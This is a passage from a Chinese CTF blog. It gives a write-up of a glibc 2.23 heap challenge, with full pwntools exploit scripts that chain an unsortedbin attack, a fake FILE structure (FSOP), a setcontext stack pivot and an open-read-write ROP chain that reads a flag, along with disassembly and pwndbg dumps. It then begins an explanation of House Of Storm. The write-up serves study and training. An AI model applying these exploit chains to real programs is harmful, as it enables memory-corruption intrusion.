class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">1360</span>) <span class="comment"># 这里指向 orw_addr-24 的位置</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span> + orw</span><br><span class="line"></span><br><span class="line">payload= payload.ljust(<span class="number">0x420</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload= payload + fake_file</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload) <span class="comment"># 确保此时unsortedbin中只有目标chunk</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1040</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>先说一下我的思路吧：</p>
<ul>
<li>我先想到了 house of orange 后半节的 FSOP 攻击，于是进行了模仿</li>
<li>用 unsortedbin attack 在 io_list_all 上写入 main_arena + 88</li>
<li>在利用堆风水，成功构造出 heap overlappling，改写 unsorted chunk-&gt; size 为“0x61”</li>
<li>那么程序就将会把 unsorted chunk 识别为 small chunk，并且会把其当做 FILE 结构体</li>
<li>接下来就在 fake small chunk 中伪造 FILE 结构体，把 vtable 字段写入 ORW 的地址</li>
</ul>
<p>需要注意的地方：</p>
<ul>
<li>堆风水是关键，需要先申请一个大chunk，释放掉，然后再次申请它（这次申请的size要小一些），这样就可以造成堆溢出</li>
<li>其次就是伪造 FILE 结构体的时候，需要保证 unsortedbin 中只有一个chunk（这个chunk将会被修改“size”），不然就会报错</li>
<li>当成功劫持 io_list_all 后，会执行 fake vtable 中的 <code>_IO_OVERFLOW</code>（详情请了解FSOP），可以把它覆盖为我们需要执行的任何函数，而它会把“fake small chunk-&gt; presize”当成它的第一个参数（我直接在这里写上了“/bin/sh”）</li>
</ul>
<p>但这个exp有很明显的问题：</p>
<ul>
<li>ORW链是写在堆上的，根本控制不了栈上的数据（我当时竟然没有发现？！）</li>
</ul>
<p>接下来就需要利用 setcontext 来控制 RSP 了，先看看 setcontext 的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000047B</span>40 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000047B</span>40                 push    rdi</span><br><span class="line">.text:<span class="number">0000000000047B</span>41                 lea     rsi, [rdi+<span class="number">128</span>h] ; nset</span><br><span class="line">.text:<span class="number">0000000000047B</span>48                 <span class="keyword">xor</span>     edx, edx        ; oset</span><br><span class="line">.text:<span class="number">0000000000047B</span>4A                 mov     edi, <span class="number">2</span>          ; how</span><br><span class="line">.text:<span class="number">0000000000047B</span>4F                 mov     r10d, <span class="number">8</span>         ; sigsetsize</span><br><span class="line">.text:<span class="number">0000000000047B</span>55                 mov     eax, <span class="number">0</span>Eh</span><br><span class="line">.text:<span class="number">0000000000047B</span>5A                 syscall                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:<span class="number">0000000000047B</span>5C                 pop     rdi</span><br><span class="line">.text:<span class="number">0000000000047B</span>5D                 cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF001h</span><br><span class="line">.text:<span class="number">0000000000047B</span>63                 jnb     <span class="keyword">short</span> loc_47BC0</span><br><span class="line">.text:<span class="number">0000000000047B</span>65                 mov     rcx, [rdi+<span class="number">0E0</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>6C                 fldenv  byte ptr [rcx]</span><br><span class="line">.text:<span class="number">0000000000047B</span>6E                 ldmxcsr dword ptr [rdi+<span class="number">1</span>C0h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>75                 mov     rsp, [rdi+<span class="number">0</span>A0h] <span class="comment">// target</span></span><br><span class="line">.text:<span class="number">0000000000047B</span>7C                 mov     rbx, [rdi+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>83                 mov     rbp, [rdi+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>87                 mov     r12, [rdi+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>8B                 mov     r13, [rdi+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>8F                 mov     r14, [rdi+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>93                 mov     r15, [rdi+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>97                 mov     rcx, [rdi+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>9E                 push    rcx</span><br><span class="line">.text:<span class="number">0000000000047B</span>9F                 mov     rsi, [rdi+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>A3                 mov     rdx, [rdi+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>AA                 mov     rcx, [rdi+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>B1                 mov     r8, [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>B5                 mov     r9, [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>B9                 mov     rdi, [rdi+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>B9 ; &#125; <span class="comment">// starts at 47B40</span></span><br><span class="line">.text:<span class="number">0000000000047B</span>BD ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000047B</span>BD                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">0000000000047B</span>BF                 retn</span><br></pre></td></tr></table></figure>
<p>注意这一句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     rsp, [rdi+<span class="number">0</span>A0h]</span><br></pre></td></tr></table></figure>
<p>发现这个函数可以根据 <code>rdi</code> 来控制 <code>rsp</code> ，而 <code>rdi</code> 可以被我们控制</p>
<p>但也需要注意这两句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000047B</span>97                 mov     rcx, [rdi+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>9E                 push    rcx</span><br></pre></td></tr></table></figure>
<p>这个 push 会扰乱我们的ROP链，把 <code>rcx</code> 作为新的栈顶（这里坑了我好多次）</p>
<p>不多说了，先看看代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span> <span class="comment"># 0x410 ~ 0xa9be</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to delete?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to edit?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to show?\n&#x27;</span>,<span class="built_in">str</span>(index))	</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x6b0</span>,<span class="string">&#x27;hehehehe&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;./flag\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">3952488</span></span><br><span class="line">system_libc=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">one_gadget_list=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">2</span>]+libc_base</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&#x27;io_list_all &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">success(<span class="string">&#x27;setcontext &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=leak_addr-<span class="number">1344</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x000000000003a738</span></span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x0000000000021112</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">syscall_ret=libc_base+<span class="number">0x00000000000bc3f5</span></span><br><span class="line"></span><br><span class="line">bss_addr=heap_base+<span class="number">0x18</span></span><br><span class="line">flag_addr=heap_base+<span class="number">3088</span></span><br><span class="line">orw_addr=heap_base+<span class="number">1392</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(flag_addr,0)</span></span><br><span class="line">orw =  p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">orw +=  p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">frame_rsp=orw_addr+<span class="number">8</span></span><br><span class="line">frame_rcx=pop_rax_ret</span><br><span class="line">frame = p64(frame_rsp) <span class="comment">#rdi+0xA0</span></span><br><span class="line">frame += p64(frame_rcx) <span class="comment">#rdi+0xA8</span></span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) </span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(frame_rsp) <span class="comment">#rdi+0xA0</span></span><br><span class="line">fake_file += p64(frame_rcx) <span class="comment">#rdi+0xA8</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">1360</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span> + p64(setcontext+<span class="number">53</span>) + orw</span><br><span class="line">payload= payload.ljust(<span class="number">0x420</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload= payload+fake_file</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1040</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这里说明一下 setcontext 的使用：</p>
<p>这里我选择把 setcontext 写入 fake vtable-&gt;_IO_OVERFLOW 中 ，执行 setcontext 时，<code>rdi</code> 寄存器就会指向“fake small chunk-&gt; presize”所在的地址，而我提前在 <code>rdi+0xa0</code> 和 <code>rdi+0xa8</code> 的位置布置好 <code>fake rsp</code> 和 <code>fake rcx</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55b7807e5960</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55b7807e5960</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span> </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55b7807e5968</span> ◂— <span class="number">0x61</span> <span class="comment">/* &#x27;a&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55b7807e5970</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55b7807e5978</span> —▸ <span class="number">0x7f11a54eb510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55b7807e5980</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55b7807e5988</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55b7807e5990</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55b7807e5998</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55b7807e59a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x55b7807e59e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x55b7807e5a00</span> —▸ <span class="number">0x55b7807e5578</span> ◂— <span class="number">0x2</span> <span class="comment">// rdi+0xa0 </span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x55b7807e5a08</span> —▸ <span class="number">0x7f11a5160738</span> (mblen+<span class="number">104</span>) ◂— pop    rax <span class="comment">// rdi+0xa8</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x55b7807e5a10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x55b7807e5a18</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│  <span class="number">0x55b7807e5a20</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│  <span class="number">0x55b7807e5a38</span> —▸ <span class="number">0x55b7807e5550</span> ◂— <span class="number">0x0</span> <span class="comment">// fake vtable addr</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55b7807e5550</span> <span class="comment">// fake vtable addr</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55b7807e5550</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55b7807e5568</span> —▸ <span class="number">0x7f11a516db85</span> (setcontext+<span class="number">53</span>) ◂— mov    rsp, qword ptr [rdi + <span class="number">0xa0</span>] <span class="comment">// fake vtable -&gt; _IO_OVERFLOW</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55b7807e5570</span> —▸ <span class="number">0x7f11a5160738</span> (mblen+<span class="number">104</span>) ◂— pop    rax</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55b7807e5578</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55b7807e5580</span> —▸ <span class="number">0x7f11a5147112</span> (iconv+<span class="number">194</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55b7807e5588</span> —▸ <span class="number">0x55b7807e5c10</span> ◂— <span class="number">0x67616c662f2e</span> <span class="comment">/* &#x27;./flag&#x27; */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55b7807e5590</span> —▸ <span class="number">0x7f11a51462f8</span> (init_cacheinfo+<span class="number">40</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x55b7807e5598</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x55b7807e55a0</span> —▸ <span class="number">0x7f11a5127b92</span> ◂— pop    rdx</span><br></pre></td></tr></table></figure>
<p>现在 <code>rsp</code> 将会指向 fake vtable -&gt; _IO_OVERFLOW（ORW的头部），之后就可以顺利读出 flag 了</p>
<hr>
<p><strong>小结</strong></p>
<p>这个题目花了我很长的时间，我也学习到了 FSOP，堆上ORW，甚至是 House Of Storm（虽然没有成功）</p>
<p>在进行 FSOP 时，我的堆布局前前后后被改了十几次，因为这是我第一次尝试 FSOP 没有什么经验，所以我所有的操作都是以 House Of Orange 为模板进行修改的，当时很苦恼，因为报错了也不知道原因，只能盲目的模仿，好在最后还是模仿出来了</p>
<p>进行FSOP攻击后，我可以执行libc中的函数，但就是执行不了我的ORW链，后来发现我把ORW链写在堆中，需要栈迁移来调整栈空间，最后在学长的帮助下我了解到了 setcontext 函数，分析其源码过后，成功利用它执行了ORW链</p>
<p>PS：其实最开始我以为这题需要用到 largebin attack 的知识（比如：House Of Storm），所以我也去学了一下</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/27/House%20Of%20Storm-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/27/House%20Of%20Storm-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Storm-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-27 22:47:19" itemprop="dateCreated datePublished" datetime="2022-03-27T22:47:19+08:00">2022-03-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-06 14:40:59" itemprop="dateModified" datetime="2022-04-06T14:40:59+08:00">2022-04-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Storm"><a href="#House-Of-Storm" class="headerlink" title="House Of Storm"></a>House Of Storm</h2><p>House Of Storm 是一种结合了 <code>unsortedbin attack</code> 和 <code>Largebin attack</code> 的攻击技术，其基本原理和 <code>Largebin attack</code> 类似 </p>
<p>House Of Storm 可以在任意地址写出chunk地址，进而把这个地址的高位当作size，可以进行任意地址分配chunk，也就是可以造成任意地址写的后果，危害十分之大，但是其条件也是非常的苛刻</p>
<hr>
<h2 id="House-Of-Storm-利用姿势"><a href="#House-Of-Storm-利用姿势" class="headerlink" title="House Of Storm 利用姿势"></a>House Of Storm 利用姿势</h2><p>House Of Storm 利用条件：</p>
<ul>
<li>libc版本小于libc-2.30（因为libc-2.30之后加入了检查）</li>
